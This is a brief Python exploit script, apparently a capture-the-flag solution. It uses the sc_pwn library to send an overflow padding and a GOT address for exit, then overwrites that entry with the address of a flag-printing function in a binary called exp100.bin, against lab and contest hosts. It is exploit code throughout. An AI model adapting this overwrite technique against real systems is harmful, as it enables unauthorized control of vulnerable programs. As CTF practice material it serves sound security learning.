#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.139','port':8080}, \
                        remote  = {'host':'10.13.37.21','port':1337})
env.select()

binf = ELF('exp100.bin')
addr_got_exit   = binf.got('exit')
addr_flag       = 0x400826

#==========
def attack(cmn):
    exploit  = 'a'*0x28
    exploit += pack_64(addr_got_exit)

    cmn.sendln(exploit)
    cmn.sendln(pack_64(addr_flag))

    print cmn.read_all()

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)
    
    del(cmn)
    
#==========
